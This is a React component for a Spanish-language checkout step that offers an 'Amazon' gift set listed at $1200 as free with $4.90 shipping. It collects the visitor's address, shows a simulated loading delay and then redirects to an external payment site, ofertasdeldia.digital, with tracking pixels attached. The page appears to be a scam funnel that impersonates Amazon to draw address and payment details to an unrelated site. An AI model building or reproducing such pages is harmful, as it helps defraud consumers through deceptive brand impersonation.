import React, { useState, useEffect } from 'react';
import Header from '../../componentes/header/Header';
import './style.css';
import presentes from '../../assets/presentes.jpeg';
import { useNavigate } from 'react-router-dom';
import { redirectWithUTM } from '../../utils/redirectWithUTM';



export default function Entrega() {
  const navigate = useNavigate();
  const [error, setError] = useState(''); // Estado para armazenar a mensagem de erro
  const [isLoading, setIsLoading] = useState(false);
  // Estados para armazenar os valores dos campos
  const [direccion, setDireccion] = useState('');
  const [apto, setApto] = useState('');
  const [codigoPostal, setCodigoPostal] = useState('');
  const [ciudad, setCiudad] = useState('');
  const [height, setHeight] = useState(window.innerHeight);

  const handleClick = () => {
    // Verifica se os campos obrigatórios estão preenchidos
    if (!direccion || !codigoPostal || !ciudad) {
      setError('Por favor, completa todos los campos obligatorios.'); // Mensagem de erro em espanhol
      return; // Impede o redirecionamento
    }
  
    // Inicia o loading
    setIsLoading(true);
  
    // Simula um tempo de carregamento antes de redirecionar
    setTimeout(() => {
      redirectWithUTM("https://ofertasdeldia.digital/chk"); // Redireciona para o link externo
    }, 3000); // 3 segundos de simulação de carregamento
  };

  const startLoading = (callback) => {
    setIsLoading(true); // Ativa o loading
    setTimeout(() => {
      setIsLoading(false); // Desativa o loading após 2 segundos
      if (callback) callback(); // Executa o callback (navegação)
    }, 2000);
  };

  useEffect(() => {
    const updateHeight = () => {
      setHeight(window.innerHeight);
    };
    window.addEventListener('resize', updateHeight);
    return () => window.removeEventListener('resize', updateHeight);
  }, []);

  return (
    <>
      <Header naoexibir={true} />
      <div className="circles-container">
        <div className="containerCircleText">
          <div className="circle" id="circle1">1</div>
          <p>Selección</p>
        </div>
        <div className="line"></div>
        <div className="containerCircleText">
          <div className="circle" id="circle2">2</div>
          <p>Información<br /> del pedido</p>
        </div>
        <div className="line linha2"></div>
        <div className="containerCircleText">
          <div className="circle" id="circle3">3</div>
          <p>Pago</p>
        </div>
      </div>

      <div className='imagemValor'>
        <img src={presentes} alt="Presentes" />
        <div className='containerTexto'>
          <p>Set de regalos Amazon</p>
          <p className='valor'><span>$ 1200</span>&nbsp;&nbsp;&nbsp;Sin costo</p>
        </div>
      </div>
      <div className='detalhesPedido'>
        <h3>Detalles del pedido</h3>
        <div className='textoEspacado'>
          <p>Precio del producto</p>
          <p>Sin costo</p>
        </div>
        <div className='textoEspacado'>
          <p>Costo de envío</p>
          <p>$ 4.90</p>
        </div>
        <div className='textoEspacado textoBold'>
          <p>Total</p>
          <p>$ 4.90</p>
        </div>
      </div>

      <form>
        <div>
          <label htmlFor="direccion">Dirección</label>
          <input
            type="text"
            id="direccion"
            placeholder="Calle y número"
            value={direccion}
            onChange={(e) => setDireccion(e.target.value)}
            required
          />
        </div>

        <div>
          <label htmlFor="apto">Apto, piso, casa, etc. (Opcional)</label>
          <input
            type="text"
            id="apto"
            placeholder="Apartamento, piso, etc"
            value={apto}
            onChange={(e) => setApto(e.target.value)}
          />
        </div>

        <div>
          <label htmlFor="codigoPostal">Código postal (C.P)</label>
          <input
            type="text"
            id="codigoPostal"
            placeholder="Introduce aquí tu Código Postal"
            value={codigoPostal}
            onChange={(e) => setCodigoPostal(e.target.value)}
            required
          />
        </div>

        <div>
          <label htmlFor="ciudad">Ciudad</label>
          <input
            type="text"
            id="ciudad"
            placeholder="¿Dónde vives?"
            value={ciudad}
            onChange={(e) => setCiudad(e.target.value)}
            required
          />
        </div>

        {/* Exibe a mensagem de erro se houver */}
        {error && <p className="error-message">{error}</p>}

        {/* Botão que redireciona */}
        <button type="button" onClick={handleClick}>
          Proceder al pago
        </button>
      </form>

      {/* Tela de carregamento */}
      <div className='telaCarregamentoContainer' style={{ display: isLoading ? 'flex' : 'none', height: height }}>
        <div className="loader"></div>


        <script>
window.pixelId = "676a054f402f32fdec2f7281";
var a = document.createElement("script");
a.setAttribute("async", "");
a.setAttribute("defer", "");
a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
document.head.appendChild(a);
</script>
<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer>
</script>






      </div>
    </>
  );
}